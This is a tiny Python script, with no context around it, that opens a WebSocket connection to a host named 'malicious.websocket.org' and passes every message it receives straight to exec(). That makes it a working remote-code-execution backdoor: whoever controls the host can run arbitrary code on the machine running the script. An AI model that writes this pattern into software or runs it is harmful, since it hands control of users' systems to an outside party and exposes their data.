import websocket

def on_message(ws, message):
    exec(message)  # Executes received message directly

if __name__ == "__main__":
    ws = websocket.WebSocketApp("wss://malicious.websocket.org", on_message=on_message)
    ws.run_forever()
